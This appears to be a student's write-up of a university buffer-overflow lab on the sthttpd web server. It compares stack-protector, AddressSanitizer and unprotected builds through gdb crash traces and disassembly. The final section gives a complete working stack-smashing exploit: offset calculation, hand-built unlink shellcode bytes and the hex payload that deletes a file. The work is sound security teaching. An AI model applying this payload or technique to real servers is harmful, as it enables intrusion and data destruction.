@@ -1,0 +1,534 @@
+smashinglab.txt
+---------------
+////////////////////////////////////////////////////////////////////////////////////////
+// Question 0: Setting Everything Up
+////////////////////////////////////////////////////////////////////////////////////////
+/*
+Overview:
+    we update gcc to the newest version.
+    we unzip the sthttpd file
+    we edit the libhttpd.c and sthttpd.c as indicated in the spec
+*/
+
+$export PATH="/usr/local/cs/bin:$PATH"
+$which gcc
+OUTPUT: /usr/local/cs/bin/gcc
+$gcc -v
+OUTPUT: ... gcc version 6.3.0 (GCC)
+
+<Move sthttpd-2.27.0.tar.gz into current directory>
+$tar -xvf sthttpd-2.27.0.tar.gz
+$cd sthttpd-2.27.0
+$cd src
+$vi thttpd.c
+
+<Implement the following changes:
+thttpd.c
+--------
+read_config( char* filename )
+    {
+    FILE* fp;
+-    char line[10000];
++    char line[100];
+    char* cp;
+    char* cp2;
+    char* name;
+. . .
+	exit( 1 );
+ 	}
+-    while ( fgets( line, sizeof(line), fp ) != (char*) 0 )
++    while ( fgets( line, 1000, fp ) != (char*) 0 )
+ 	{
+ 	/* Trim comments. */
+ 	if ( ( cp = strchr( line, '#' ) ) != (char*) 0 )
+libhttpd.c
+----------
+ 	}
+    else if ( IN6_IS_ADDR_V4MAPPED( &saP->sa_in6.sin6_addr ) && strncmp( str, "::ffff:", 7 ) == 0 )
+ 	/* Elide IPv6ish prefix for IPv4 addresses. */
+-	(void) strcpy( str, &str[7] );
++	(void) memmove( str, &str[7], strlen (&str[7]) + 1 );
+    return str;>
+NOTE: For whatever reason, my implementations in this lab worked without the bug with
+strcpy, I added it in this section for good measure
+
+$cd ..
+
+/*
+    Overview:
+    we run the configure command
+    we clean, compile, and rename the 3 variants of thttpd
+*/
+
+$./configure \ LDFLAGS="-Xlinker --rpath=/usr/local/cs/gcc-$(gcc -dumpversion)/lib"
+$make clean
+$make CFLAGS='-g3 -O2 -fno-inline -fstack-protector-strong'
+$mv src/thttpd src/thttpd-sp
+$make clean
+$make CFLAGS='-g3 -O2 -fno-inline -fsanitize=address'
+$mv src/thttpd src/thttpd-as
+$make clean
+$make CFLAGS='-g3 -O2 -fno-inline -fno-stack-protector -zexecstack'
+$mv src/thttpd src/thttpd-no
+
+/*
+Overview:
+    we create a foo.txt file
+    we run all 3 variants on specified ports
+    we curl foo.txt for all 3 different variants
+    NOTES:
+    X = 704751588
+    Y = [[sp, 1], [as, 2], [no, 3]]
+    (12330 + 3 * (X % 293) + Y)
+        sp: 12790
+        as: 12791
+        no: 12792
+        ...Calculated using Google Calculator
+*/
+
+$echo 'hello world' > foo.txt
+
+$src/thttpd-sp -p 12790
+$src/thttpd-sp -p 12790 -D
+$curl http://localhost:12790/foo.txt
+OUTPUT: hello world
+
+$src/thttpd-sp -p 12790
+$src/thttpd-as -p 12791 -D
+$curl http://localhost:12791/foo.txt
+OUTPUT: hello world
+
+$src/thttpd-sp -p 12790
+$src/thttpd-no -p 12792 -D
+$curl http://localhost:12792/foo.txt
+OUTPUT: hello world
+
+////////////////////////////////////////////////////////////////////////////////////////
+// Question 1-9: Causing a crash
+////////////////////////////////////////////////////////////////////////////////////////
+/*
+Q1,4,7:
+I crashed all 3 variants using the same text document bugs.txt. In this file 
+I put more than 100 characters. Looking at the C source code, I altered the file by
+making the buffer only 100 characters. When a file such as bugs.txt is used, the
+program does not allocate enough space for the text document. This causes the buffer
+to overflow. In the -sp variant, the canary catches the error. In the -as variant,
+stack checking catches the error. In the -no variant, the program runs the entire
+way through. The seg fault occurs due to the file being written into parts of memory
+that were not allocated by the buffer. 
+
+Q2,3:
+Specific Line:
+0x0000000000405051 <read_config+1521>:	e8 5a d4 ff ff	callq  0x4024b0 <__stack_chk_fail@plt>
+The stack protection flag tells the compile to implement canary bit checking in the
+program. This is the sepcific line where the program checks the canary bit has been
+changed. The canary bit has been changed, as we overwrote the buffer with a file > 100
+chars. stack_chk_fail crashes the program.
+
+Q5,6:
+Specific Line:
+0x00000000004e0b4c <read_config+188>:e8 2f a5 f5 ffcallq  0x43b080 <__interceptor_strchr(char const*, int)>
+The program is checking for stack corruption, by viewing the stack outside the allocated
+locations. In this case the program detected a stack corruption and is going to crash.
+We can see from the previous lines, that the program does this by looking into memory
+not allocated, PLEASE REFER TO QUESTION 10 FOR ADDITIONAL INFORMATION ON THIS.
+After finding the corruption, interceptor_strchr causes the crash.
+
+Q8,9:
+Specific Line:
+0x0000000000404d9f <read_config+1215>:c3retq
+The program does not have any safeties, thus the program runs all the way through, and
+seg faults at the end due to stack corruption.
+
+NOTE: If any of these explanations are not thorough enough please refer to question 10.
+*/
+
+/*
+Overview:
+    we create a text document with more than 100 characters
+        This text document is attached and saved as bugs.txt
+        All 3 variants crashed with the same text document
+    we run the 3 variants
+    we collect the backtrace
+    we locate the location of the machine code crash
+*/
+
+$vi bugs.txt
+<created text document; text document submitted as bugs.txt>
+
+$gdb src/thttpd-sp
+(gdb) r -p 12790 -D -C bugs.txt
+OUTPUT:
+Program received signal SIGSEGV, Segmentation fault.
+0x00007ffff6db3118 in ?? () from /lib64/libgcc_s.so.1
+
+(gdb) bt
+OUTPUT:
+#0  0x00007ffff6db3118 in ?? () from /lib64/libgcc_s.so.1
+#1  0x00007ffff6db4019 in _Unwind_Backtrace () from /lib64/libgcc_s.so.1
+#2  0x00007ffff76e8636 in backtrace () from /lib64/libc.so.6
+#3  0x00007ffff7651f24 in __libc_message () from /lib64/libc.so.6
+#4  0x00007ffff76ec047 in __fortify_fail () from /lib64/libc.so.6
+#5  0x00007ffff76ec010 in __stack_chk_fail () from /lib64/libc.so.6
+#6  0x0000000000405056 in read_config (filename=<optimized out>)
+    at thttpd.c:1190
+#7  0x0000000000006463 in ?? ()
+#8  0x0000000000000018 in ?? ()
+#9  0x00007fffffffe5c5 in ?? ()
+#10 0x00007fffffffd120 in ?? ()
+#11 0x00007fffffffd0a0 in ?? ()
+#12 0x00007fffffffe2c0 in ?? ()
+#13 0x0000000000000000 in ?? ()
+NOTE: backtrace here
+NOTE: thttpd.c:1190 indicates there is a problem at line 1190
+
+(gdb) b 1190
+(gdb) set disassemble-next-line on
+(gdb) r -p 12790 -D -C bugs.txt
+OUTPUT:
+0x0000000000404f23 <read_config+1219>:	48 8b 44 24 68	mov    0x68(%rsp),%rax
+0x0000000000404f28 <read_config+1224>:	64 48 33 04 25 28 00 00 00	xor    %fs:0x28,%rax
+0x0000000000404f31 <read_config+1233>:	0f 85 1a 01 00 00	jne    0x405051 <read_config+1521>
+0x0000000000404f37 <read_config+1239>:	48 83 c4 70	add    $0x70,%rsp
+0x0000000000404f3b <read_config+1243>:	5b	pop    %rbx
+0x0000000000404f3c <read_config+1244>:	5d	pop    %rbp
+0x0000000000404f3d <read_config+1245>:	41 5c	pop    %r12
+0x0000000000404f3f <read_config+1247>:	41 5d	pop    %r13
+0x0000000000404f41 <read_config+1249>:	41 5e	pop    %r14
+0x0000000000404f43 <read_config+1251>:	c3	retq  
+(gdb) si
+(gdb)
+. . .
+OUTPUT:
+0x0000000000405051 <read_config+1521>:	e8 5a d4 ff ff	callq  0x4024b0 <__stack_chk_fail@plt>
+(gdb)
+OUTPUT:
+0x00000000004024b0 <__stack_chk_fail@plt+0>:ff 25 42 2c 21 00jmpq   *0x212c42(%rip)        # 0x6150f8 <__stack_chk_fail@got.plt>
+NOTE: machine code that causes crash is here.
+(gdb) q
+
+$gdb src/thttpd-as
+(gdb) r -p 12791 -D -C bugs.txt
+OUTPUT:
+Program received signal SIGSEGV, Segmentation fault.
+0x00007ffff7075118 in ?? () from /lib64/libgcc_s.so.1
+
+(gdb) bt
+OUTPUT:
+#0  0x00007ffff7075118 in ?? () from /lib64/libgcc_s.so.1
+#1  0x00007ffff7076019 in _Unwind_Backtrace () from /lib64/libgcc_s.so.1
+#2  0x00000000004b8ae3 in __sanitizer::BufferedStackTrace::SlowUnwindStack (
+    this=0x7fffffffbd30, pc=4435657, max_depth=<optimized out>)
+    at ../../../../gcc-6.3.0/libsanitizer/sanitizer_common/sanitizer_unwind_linux_libcdep.cc:113
+#3  0x00000000004b42e1 in __asan::GetStackTraceWithPcBpAndContext (fast=false, 
+    context=0x0, bp=140737488342544, pc=4435657, max_depth=256, 
+    stack=0x7fffffffbd30)
+    at ../../../../gcc-6.3.0/libsanitizer/asan/asan_stack.h:49
+#4  __asan::ReportGenericError (pc=<optimized out>, 
+    bp=bp@entry=140737488342544, sp=sp@entry=140737488340416, 
+    addr=addr@entry=140737488342708, is_write=is_write@entry=false, 
+    access_size=access_size@entry=518, exp=<optimized out>, 
+    fatal=<optimized out>)
+    at ../../../../gcc-6.3.0/libsanitizer/asan/asan_report.cc:1092
+#5  0x000000000043aee4 in __interceptor_strchr (str=<optimized out>, 
+    c=<optimized out>)
+    at ../../../../gcc-6.3.0/libsanitizer/asan/asan_interceptors.cc:468
+#6  0x00000000004e0b51 in read_config (filename=<optimized out>)
+    at thttpd.c:1018
+#7  0x7274656c62756f72 in ?? ()
+#8  0x6f7274656c62756f in ?? ()
+---Type <return> to continue, or q <return> to quit---
+NOTE: backtrace here
+NOTE: 'thttpd.c:1080' indicates there is a problem at line 1080
+
+(gdb) b 1018
+(gdb) set dissassemble-next-line on
+(gdb) r -p 12791 -D -C bugs.txt
+OUTPUT:
+0x00000000004e0b43 <read_config+179>:	48 8b 3c 24	mov    (%rsp),%rdi
+0x00000000004e0b47 <read_config+183>:	be 23 00 00 00	mov    $0x23,%esi
+0x00000000004e0b4c <read_config+188>:	e8 2f a5 f5 ff	callq  0x43b080 <__interceptor_strchr(char const*, int)>
+0x00000000004e0b51 <read_config+193>:	48 85 c0	test   %rax,%rax
+0x00000000004e0b54 <read_config+196>:	74 24	je     0x4e0b7a <read_config+234>
+(gdb) si
+(gdb)
+...
+OUTPUT:
+interceptor_strchr (str=str@entry=0x7fffffffce50 "port=troub"...
+NOTE: machine code that causes crash is here. 
+(gdb) q
+
+$gdb src/thttpd-no
+(gdb) r -p 12792 -D -C bugs.txt
+OUTPUT:
+Program received signal SIGSEGV, Segmentation fault.
+0x0000000000404d9f in read_config (filename=<optimized out>) at thttpd.c:1190
+1190	    }
+(gdb) bt
+OUTPUT:
+#0  0x0000000000404d9f in read_config (filename=<optimized out>)
+    at thttpd.c:1190
+#1  0x74656c62756f7274 in ?? ()
+#2  0x7274656c62756f72 in ?? ()
+#3  0x6f7274656c62756f in ?? ()
+#4  0x756f7274656c6275 in ?? ()
+#5  0x62756f7274656c62 in ?? ()
+#6  0x6c62756f7274656c in ?? ()
+#7  0x656c62756f727465 in ?? ()
+#8  0x74656c62756f7274 in ?? ()
+#9  0x7274656c62756f72 in ?? ()
+#10 0x6f7274656c62756f in ?? ()
+#11 0x756f7274656c6275 in ?? ()
+#12 0x62756f7274656c62 in ?? ()
+#13 0x6c62756f7274656c in ?? ()
+#14 0x656c62756f727465 in ?? ()
+#15 0x74656c62756f7274 in ?? ()
+#16 0x7274656c62756f72 in ?? ()
+#17 0x6f7274656c62756f in ?? ()
+#18 0x756f7274656c6275 in ?? ()
+#19 0x62756f7274656c62 in ?? ()
+#20 0x6c62756f7274656c in ?? ()
+#21 0x656c62756f727465 in ?? ()
+NOTE: backtrace here
+NOTE: 'thttpd.c:1190' indicates there is a problem at line 1190
+
+(gdb) b 1190
+(gdb) set disassemble-next-line on
+(gdb) r -p 12792 -D -C bugs.txt
+OUTPUT:
+0x0000000000404d93 <read_config+1203>:	48 83 c4 70	add    $0x70,%rsp
+0x0000000000404d97 <read_config+1207>:	5b	pop    %rbx
+0x0000000000404d98 <read_config+1208>:	5d	pop    %rbp
+0x0000000000404d99 <read_config+1209>:	41 5c	pop    %r12
+0x0000000000404d9b <read_config+1211>:	41 5d	pop    %r13
+0x0000000000404d9d <read_config+1213>:	41 5e	pop    %r14
+0x0000000000404d9f <read_config+1215>:	c3	retq   
+NOTE: machine code that causes crash is here. 
+
+////////////////////////////////////////////////////////////////////////////////////////
+// Question 10: Why it crashed
+////////////////////////////////////////////////////////////////////////////////////////
+/*
+Q10:
+comparisons
+-----------
+the assembly code for -sp and -no look very similar. -sp offers checking for seg faults
+and buffer overflow while -no doesn't. Surprisinly, the assembly code of fsanitize is
+a lot larger and performs far more checks for memory corruption than -sp. this is further
+elaborated in the following:
+
+fstack-protector-strong
+-----------------------
+stack protector uses the canary to see if the memory is corrupted.
+0x0000000000404f23 <read_config+1219>:	48 8b 44 24 68	mov    0x68(%rsp),%rax
+0x0000000000404f28 <read_config+1224>:	64 48 33 04 25 28 00 00 00	xor    %fs:0x28,%rax
+0x0000000000404f31 <read_config+1233>:	0f 85 1a 01 00 00	jne    0x405051 <read_config+1521>
+0x0000000000404f37 <read_config+1239>:	48 83 c4 70	add    $0x70,%rsp
+0x0000000000404f3b <read_config+1243>:	5b	pop    %rbx
+0x0000000000404f3c <read_config+1244>:	5d	pop    %rbp
+0x0000000000404f3d <read_config+1245>:	41 5c	pop    %r12
+0x0000000000404f3f <read_config+1247>:	41 5d	pop    %r13
+0x0000000000404f41 <read_config+1249>:	41 5e	pop    %r14
+0x0000000000404f43 <read_config+1251>:	c3	retq  
+...
+0x0000000000405051 <read_config+1521>:	e8 5a d4 ff ff	callq  0x4024b0 <__stack_chk_fail@plt>
+
+the problem is that the program only checks the canary at the end. we know this because
+the only difference between -sp and -no (which offers no protection) is the lines above.
+-sp calls stack_chk_fail, which crashes the program if the canary had been altered...
+aka memory corrupted. This is different than -fsanitize which checks for corruption far
+more often. The canary bit is a security tactic used to thwart buffer overflows.
+Basically, if the buffer overflows, the canary bit changes which can be detected by the
+machine.
+
+fsanitize=address
+-----------------
+fsanitize detects if memory is being accesed out-of-bounds.
+movl $httpd_err400form, %eax
+shrq $3, %rax
+cmpb $0, 2147450880(%rax)
+jne  .l1060
+we can see in the machine code that snippets similar to that which is displayed above
+is called every couple of lines. this is because -fsanitize is checking if parts of
+memory that should not be accessesed changes (we can see this when the address is
+compared with $0). This memory is sometimes refered to as shadow memory. if the value 
+is changed the machine code jumps to .l1178 which we can see calls httpd_err400form. 
+in simpler terms, the machine code for fsanitize checks if the memory corrupts everytime
+it is accessed, by checking if the shadow memory "initially allocated" changes. one
+should also note that this check is performed very regularly in fsanitize. Unlike
+-sp, -as checks for buffer-overflow exploits far more often.
+
+fno-stack-protector
+-------------------
+compared to the others this is the least secure code. it does not check if memory had
+been corruped every access like fsanitize. futhermore, it does not check if the canary
+had been altered like fstack-protector-strong.
+*/
+
+/*
+Overview:
+    we generate assembly language code for the 3 variants
+    we open them in vim and analyze them
+*/
+
+$./configure \ ldflags="-xlinker --rpath=/usr/local/cs/gcc-$(gcc -dumpversion)/lib"
+$make clean
+$make cflags='-g3 -o2 -fno-inline -fstack-protector-strong'
+$mv src/thttpd.o src/thttpd-sp.s
+$make clean
+$make cflags='-g3 -o2 -fno-inline -fsanitize=address'
+$mv src/thttpd.o src/thttpd-as.s
+$make clean
+$make cflags='-g3 -o2 -fno-inline -fno-stack-protector -zexecstack'
+$mv src/thttpd.o src/thttpd-no.s
+note: you can read the files with $vi src/thttpd-xx.s
+
+////////////////////////////////////////////////////////////////////////////////////////
+// Question 11: Let's cause some trouble!
+////////////////////////////////////////////////////////////////////////////////////////
+/*
+    note: all files used in this section are attached including:
+    hex.txt
+    hack.txt
+*/
+
+Files are deleted via unlink.c. Basically the following code would delete target.txt:
+#include <unistd.h>
+int main()
+{
+    char file[] = "target.txt";
+    unlink(file);
+    return 0;
+}
+
+I wrote saved this as a .c file called unlink.c and compiled it to get the hexadecimal
+representation of this code (op codes), using $gcc -g -c unlink.c and $objdump -d unlink.c
+this gives me:
+   0:	55                   	push   %rbp
+   1:	48 89 e5             	mov    %rsp,%rbp
+   4:	48 83 ec 10          	sub    $0x10,%rsp
+   8:	48 b8 74 61 72 67 65 	movabs $0x742e746567726174,%rax
+   f:	74 2e 74 
+  12:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
+  16:	66 c7 45 f8 78 74    	movw   $0x7478,-0x8(%rbp)
+  1c:	c6 45 fa 00          	movb   $0x0,-0x6(%rbp)
+  20:	48 8d 45 f0          	lea    -0x10(%rbp),%rax
+  24:	48 89 c7             	mov    %rax,%rdi
+  27:	e8 00 00 00 00       	callq  2c <main+0x2c>
+  2c:	b8 00 00 00 00       	mov    $0x0,%eax
+  31:	c9                   	leaveq 
+  32:	c3                   	retq  
+NOTE: this was performed more to shows us how unlink works 
+(based on help from TA, Patnaikuni)
+
+Now we find the hexadecimal of target.txt, which is:
+74 61 72 67 65 74 2e 74 78 74 (found using a hexadecimal convertor with ascii)
+
+Next we find the size of the buffer, with the following commands:
+$gdb src/thttpd-no
+(gdb) b read_config
+(gdb) r -p 12792 -d -c foo.txt
+(gdb) i r
+output:
+    ...
+    rsp = 0x7fffffffd028
+    ...
+(gdb) p &line
+output:
+    $1 = (char (*)[100]) 0x7fffffffcf90
+
+With this information we can find that the buffer size is 0x7fffffffcf90-0x7fffffffd028
+=152 bytes.
+
+Now lets find some code that can delete target.txt.
+Run the following commands:
+$gdb src/thttpd-no
+(gdb) b read_config
+(gdb) r -p 12792 -d -c foo.txt
+(gdb) disas /r unlink
+output:
+0x00007ffff76c7330 <+0>:b8 57 00 00 00mov    $0x57,%eax
+0x00007ffff76c7335 <+5>:0f 05syscall
+0x00007ffff76c7337 <+7>:48 3d 01 f0 ff ffcmp    $0xfffffffffffff001,%rax
+0x00007ffff76c733d <+13>:73 01jae    0x7ffff76c7340 <unlink+16>
+0x00007ffff76c733f <+15>:c3retq
+0x00007ffff76c7340 <+16>:48 8b 0d 21 fb 2c 00mov    0x2cfb21(%rip),%rcx        # 0x7ffff7996e68
+0x00007ffff76c7347 <+23>:f7 d8neg    %eax
+0x00007ffff76c7349 <+25>:64 89 01mov    %eax,%fs:(%rcx)
+0x00007ffff76c734c <+28>:48 83 c8 ffor     $0xffffffffffffffff,%rax
+0x00007ffff76c7350 <+32>:c3retq
+
+Here are the op codes that matter:
+b8 57 00 00 00 0f 05
+NOTE: To run this code we must first put the hexcode for 'target.txt' into the rdi
+register to do this we write our own .c file and find the op code for movq and rdi.
+This resulting op code for movq into rdi turns out to be:
+48bf[memory addr of 'target.txt']
+
+The Game Plan:
+we have now collected all the necessary information to carry out the exploit. The exploit
+will be carried out in the following way.
+1. We will overwrite the buffer until the return address with junk (152bytes of 0's)
+    note: this is actually (152-5) bytes because we need a 'port=' in the beg of the .txt
+2. We will rewrite the return addr. to point to our code.
+3. Our code will first store the hex code of 'target.txt' into the rdi register
+    NOTE: to do this we must determine the memory location of 'target.txt' and our code
+4. Next our code will execute unlink as found from disas.
+5. After the op codes from disas are executed, target.txt will be unlinked and deleted.
+
+The file can be created in the following way.
+Based on the descriptions above our .txt file should look like the following in binary:
+<hex of 'port='> 00 00 00 00 00 00 00 00 00 00 <code we wrote|hex of 'target.txt'>
+|<---5bytes--->|                               |<--17bytes-->|<------11bytes----->|
+|<-----------------152bytes------------------->|
+NOTE: the hex of 'target.txt' is 11 bytes instead of 10 because of the \0 byte appended
+to the end of the string
+
+Seeing that the stack pointer is at 0x7fffffffd028, our return address should be at
+0x7fffffffd030, and the location of 'target.txt\0' at 0x7fffffffd041.
+
+The hexadecimal of hex.txt looks like this:
+000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000
+00000030d0ffffff7f000048bf41d0ffffff7f0000b85700
+00000f057461726765742e74787400
+NOTE: I removed of all new lines in the actual text file
+NOTE: 'port=' is not in my original .txt file, i add it after i convert it to binary
+
+We convert this hexadecimal text file into the binary using the following linux command
+on the seasnet server: xxd -r -p hex.txt hack.txt
+
+We then add 'port=' to the beginning of hack.txt (this is because i chose to not include
+it when i wrote the original .txt hexadecimal file, in case my hexadecimal conversion for
+port=' is wrong).
+
+We're off to the races! Let's test our program.
+
+I tested my exploit with the following commands:
+$vi target.txt
+(vim) :wq
+$ls
+output:
+... target.txt ...
+$gdb src/thttpd-no
+(gdb) r -p 12792 -d -c hack.txt
+(gdb) q
+$ls
+output:
+... ...
+
+target.txt is gone!! \o/
+
+NOTE: I reproduced this test and it worked 5/5 times I tried it. However, it is
+possible that on different machines, that it fails to work (ASLR memory protection).
+i.e. This is because of the machine randomizing the addresses. 
+
+NOTE: (not very important) when I ran this for my tests I named my .txt fixed2.txt,
+but I called it hack.txt in my explanation for clarity's sake, t.f. If the hack.txt
+I submit doesn't work, it may need to be renamed to 'fixed2.txt'.
+
+End.
